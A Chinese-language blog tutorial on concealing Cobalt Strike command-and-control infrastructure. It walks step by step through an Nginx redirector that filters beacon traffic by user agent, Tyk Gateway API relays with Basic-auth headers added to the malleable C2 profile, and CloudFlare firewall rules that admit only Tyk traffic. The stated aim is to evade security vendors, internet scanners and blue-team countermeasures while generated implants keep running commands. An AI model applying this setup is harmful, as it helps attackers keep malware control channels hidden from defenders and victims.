---
title: 利用Nginx、Tyk Gateway API和CloudFlare防火墙隐藏C2设施
date: 2022-08-25 16:35:02
categories:
- 后渗透
tags:
- Cobalt Strike
- Hiding C2 Traffic
---



>本文未经允许禁止转载

## 0x01 前言

Cobalt Strike的特征已经被各大安全厂商标记烂了，加上搜索引擎、空间测绘的扫描，在配置C2域名后，如果不做好基础设施的隐匿，很快会出现下图的情况。（图片截取自某情报社区）

<img src="https://s2.loli.net/2022/08/25/oZv4UrYhA8yqLcK.png" style="zoom:67%;" />

隐藏C2的手法有很多，比如早些时候的域前置和最近热门的利用云函数隐藏。但是如今许多CDN厂商都已经禁用了域前置技术，而云函数是有免费额度的，超过之后会开始计费，许多蓝队反制帖子已经开始分享消耗云函数额度的方法了。

最近看到一篇利用Tyk Gateway API隐藏C2流量的文章，通过配置Tyk Gateway API转发恶意流量，以达到类似于域前置，或者腾讯云函数隐藏C2的效果。

在这个基础上，通过将域名托管到CloudFlare，配置Nginx过滤不符合规则的请求，并通过配置CloudFlare防火墙只允许Tyk Gateway API的流量访问C2域名，可以达到隐藏C2域名，并且防止搜索引擎、空间测绘扫描和识别Cobalt Strike特征导致域名被标记。

本文基于已经将域名托管到CloudFlare并配置SSL证书的情况，如果你不知道如何使用CloudFlare和配置SSL证书，请自行搜索相关资料。

## 0x02 配置Nginx

将域名托管到CloudFlare后，可以配置Nginx反向代理来过滤部分请求，只让信标流量转发进服务器。

### 自定义Nginx配置文件

Nginx的配置文件还是有点复杂的，可以使用[cs2modrewrite](https://github.com/threatexpress/cs2modrewrite)进行生成，然后根据需求进行修改。

这里以使用[jquery-c2.4.5.profile](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.5.profile)作为C2配置文件的情况示例：

```bash
python3 ./cs2nginx.py -i jquery-c2.4.5.profile -c https://127.0.0.1:8443 -r http://www.baidu.com/ -H yourc2.domain > ./nginx.conf
```

* -i：指定C2配置文件
* -c：指定内部的监听端口
* -r：指定302跳转的地址
* -H：指定你的域名

通过该工具生成的Nginx配置文件的`server`块的部分配置如下：

```nginx
server {
        set $C2_SERVER https://127.0.0.1:8443;
        set $REDIRECT_DOMAIN http://www.baidu.com/;
        server_name yourc2.domain;
    	......

        listen 80;
        listen [::]:80;
        
        listen 443 ssl;
        listen [::]:443 ssl;
    	......
        
       	location ~ ^(/jquery-3.3.2.slim.min.js.*|/jquery-3.3.1.min.js.*|/jquery-3.3.1.slim.min.js.*|/jquery-3.3.2.min.js.*)$ {if ( $http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
          {
            return 404;
          }
            proxy_pass          $C2_SERVER;
		......
        }
        location @redirect {
                return 302 $REDIRECT_DOMAIN$request_uri;
        }

        }
```

使用Nginx加载该配置文件后。Nginx将监听外部的80、443端口，并将符合规则的请求转发到内部的8443端口，不符合规则的请求将跳转到`http://www.baidu.com/`。

### 效果

此时通过对服务器IP地址的扫描就无法获取到我们的beacon stage了。

<img src="https://s2.loli.net/2022/08/26/rNz75bAiwQtkERq.png" alt="image-20220826100459907" style="zoom:67%;" />

## 0x03 配置Tyk Gateway API

### 注册账户

访问[注册地址](https://account.cloud-ara.tyk.io/signup)，填写用户名、邮箱、密码等信息后点击注册，注册成功后选择免费版。

<img src="https://s2.loli.net/2022/08/25/Q58cZ3YsdFaqMhu.png" alt="image-20220825174137229" style="zoom:67%;" />

然后设置组织名称，设置好后会提示`Deployment successful`。

### 创建并配置API 

点击`Manage APIs`后会看到如下页面：

<img src="https://s2.loli.net/2022/08/25/eUybjDunGM8oJzr.png" alt="img" style="zoom: 67%;" />

接下来逐一创建并配置http-get API、http-post API、Stager-x86 API、Stager-x64 API。以下以http-get API为例。

假设你的域名为`cslabtest.live`，且C2配置文件如下：

```
http-get {
 
    set uri "/api/v2/login";
   ....
}
 
http-post {
 
    set uri "/api/v2/status";
   ....
}
http-stager {
    set uri_x86 "/api/v2/GetProfilePicture";
    set uri_x64 "/api/v2/GetAttachment";
}
```

点击`Design new API`并填写API信息。

<img src="https://s2.loli.net/2022/08/25/4m2H1xNwMij3Gu8.png" alt="img" style="zoom:67%;" />

创建好后进一步配置API，来让它能够将请求转发到我们的C2服务器。

现在我们需要更改`Listen path`和`Target URL`，TYK会监听`Listen path`的地址，并将请求转发到`Target URL`。

（注：若C2配置文件为jquery-c2.4.5.profile，则将`Listen path`和`Target URL`的路径配置为相对应的`.js`的路径）

<img src="https://s2.loli.net/2022/08/25/9u8Bsjh6cSMCfFQ.png" alt="img" style="zoom:67%;" />

为了能够上线CS，还要配置`Rate Limiting and Quotas`。都选择disable即可。

<img src="https://s2.loli.net/2022/08/25/sbpULn2YTPhvwyx.png" alt="img" style="zoom:67%;" />

然后来到`Advanced Options`，取消勾选`Enable caching`。

<img src="https://s2.loli.net/2022/08/25/ax9wSqE2el6nRJ7.png" alt="img"  />

按这个步骤逐一新建http-get API、http-postAPI、Stager-x86 API、Stager-x64 API。

### 设置访问验证策略

将上一步新建的API的`Authentication`更改为`Basic Authentication`，如下所示：

<img src="https://s2.loli.net/2022/08/25/1KWilQdpevuoM7y.png" alt="img" style="zoom:67%;" />

然后来到`Policies`新建策略，选择你新建的四个API。

<img src="https://s2.loli.net/2022/08/25/l1HnpmuLrQF6tIX.png" alt="image-20220825181321725" style="zoom:67%;" />

然后点击`Global Limits and Quota`，确认禁用`Rate Limiting`。

<img src="https://s2.loli.net/2022/08/25/NRX1zoLMPQjOF9f.png" alt="img" style="zoom:67%;" />

接着配置策略名称并设置密钥过期时间。

<img src="https://s2.loli.net/2022/08/25/3s257tH9WXQuK8B.png" alt="img" style="zoom:67%;" />

点击`Create Policy`以保存新策略，之后可以在`Policies`看到它：

<img src="https://s2.loli.net/2022/08/25/6GE1ygYCP753wdL.png" alt="img" style="zoom:67%;" />

### 配置访问验证Key

来到`Keys`，点击`ADD KEY`，然后在`Apply policy`选择我们之前创建的策略，并选择API。

<img src="https://s2.loli.net/2022/08/25/kMVjDTvq6t59m7x.png" alt="image-20220825182202475" style="zoom:67%;" />

最后来到`Authentication`输入需要设置的用户名、密码，这里使用`test:testtesttest`作为用户名、密码。

<img src="https://s2.loli.net/2022/08/25/IVfpUkga6KrndHM.png" alt="img" style="zoom:67%;" />

`Key`创建成功后会有如下提示：

<img src="https://s2.loli.net/2022/08/25/OuLAM4y9PdHwSG2.png" alt="img" style="zoom:67%;" />

### 配置C2配置文件

由于上一步我们设置了访问验证，所以要在C2配置文件中添加一个请求头才能正常上线CS。

`Authorization`的请求头设置格式如下：

```
Authorization: Basic base64(username:password)
```

所以按上一步添加的`Key`，我们要在C2配置文件中添加如下请求头：

```
Authorization: Basic dGVzdDp0ZXN0dGVzdHRlc3Q=
```

最终配置文件如下：

```
http-get {
 
    set uri "/api/v2/login";
    
    client {
        header "Authorization" "Basic dGVzdDp0ZXN0dGVzdHRlc3Q=";
}
   ....
}
 
http-post {
 
    set uri "/api/v2/status";
    
    client {
        header "Authorization" "Basic dGVzdDp0ZXN0dGVzdHRlc3Q=";
}
   ....
}
http-stager {
    set uri_x86 "/api/v2/GetProfilePicture";
    set uri_x64 "/api/v2/GetAttachment";
    
    client {
        header "Authorization" "Basic dGVzdDp0ZXN0dGVzdHRlc3Q=";
}
	....
}
```

### 效果

此时直接访问我们设置的API的地址都是需要验证的，而CS是可以正常上线的。

<img src="https://s2.loli.net/2022/08/25/SvRAo7Zy4WBIYxT.png" alt="img" style="zoom:67%;" />

## 0x04 配置CloudFlare防火墙

### 获得tyk.io特征

在CF的`WAF`中创建一条防火墙规则，如下：

<img src="https://s2.loli.net/2022/08/25/e5ZWfulg9JhKOY2.png" alt="image-20220825184109796" style="zoom:67%;" />

然后生成一个木马尝试上线CS，这时肯定是无法上线的，来到CF的概述中可以看到所有拦截记录，点击单条拦截记录查看详细。

<img src="https://s2.loli.net/2022/08/25/5X98QebcMgPF2Yv.png" alt="image-20220825184546311" style="zoom:67%;" />

这里有很多的特征可以加到`WAF`拦截规则中，来实现只有`Tyk Gateway API`转发过来的流量才能允许访问，其他的流量都会阻止。

### 编辑防火墙规则

这里我以`ASN`为例子，配置如下：

<img src="https://s2.loli.net/2022/08/25/wodcvM8ufmgTYWQ.png" alt="image-20220825184917062" style="zoom:67%;" />

保存防火墙规则即可。

## 0x05 最终效果

对服务器的扫描，无法获取到我们的beacon stage。

<img src="https://s2.loli.net/2022/08/26/rNz75bAiwQtkERq.png" alt="image-20220826100459907" style="zoom:67%;" />

直接访问设置的Tyk Gateway API的地址是需要验证的。

<img src="https://s2.loli.net/2022/08/25/1W3mjGpAMBswySF.png" alt="image-20220825185304275" style="zoom:67%;" />

直接访问我们的C2域名会被CloudFlare拦截。

<img src="https://s2.loli.net/2022/08/25/KUnbLxXzH5ECNvp.png" alt="image-20220825185438993" style="zoom:67%;" />

CS创建监听器，如下：

<img src="https://s2.loli.net/2022/08/26/m6KodZ7iqONzRXL.png" alt="image-20220826103524466" style="zoom: 67%;" />

CS生成木马，可以正常上线和执行命令。

<img src="https://s2.loli.net/2022/08/25/1igUo76aJxB4IM5.png" alt="image-20220825185815180" style="zoom:67%;" />

## 0x05 问题

* 由于流量经过多次转发，上线可能会有延迟。

* 通过配置Tyk Gateway API的域名，使用HTTPS的方式上线，流量中会出现`*.tyk.io`的DNS流量记录，算是一个比较明显的特征。

<img src="https://s2.loli.net/2022/08/26/osOVWLZK19bT8mw.png" alt="image-20220826105306705" style="zoom:67%;" />

## 0x06 参考

* [Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

* [cobaltstrike配置nginx反向代理](https://www.freebuf.com/articles/others-articles/247115.html)

* [cs2modrewrite](https://github.com/threatexpress/cs2modrewrite)
